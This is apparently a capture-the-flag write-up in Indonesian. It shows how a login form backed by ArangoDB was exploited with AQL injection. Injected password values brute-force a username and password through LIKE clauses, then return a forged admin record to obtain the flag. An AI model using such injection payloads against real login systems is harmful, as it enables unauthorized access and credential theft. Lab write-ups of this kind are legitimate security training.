# H!pster Startup


Halaman admin ada di /admin

Saat mencoba menginput tanda kutip (').
Pesan `AQL syntax error`. Setelah dilakukan googling ternyata itu adalah pesan error untuk `ArangoDB` yang merupakan database NoSQL.

asumsi query login yang digunakan
```mysql
FOR u in users
FILTER u.user == USER && u.passwd == PASSWD
RETURN u
```

Awal nya kami  melakukan brute force username dan password menggunakan query berikut

```mysql
user=admin&passwd=a' OR (u.user LIKE "tim%") RETURN u.user //

```mysql
user=admin&passwd=a' OR (u.passwd LIKE "iamsoawesome%") RETURN u.user //
```

Didapatkan username : tim dan password iamsoawesome. Tapi saat login mengeluarkan pesan bahwa user tersebut bukan admin.

Oleh karena itu kami mencoba melakukan return role admin.

```mysql
user=admin&passwd=' OR (u.passwd LIKE "iamsoawesome%") RETURN {_id: "users/c", user: "admin", passwd: "admin", role: "admin"} //
```

Lalu akan memunculkan flag.
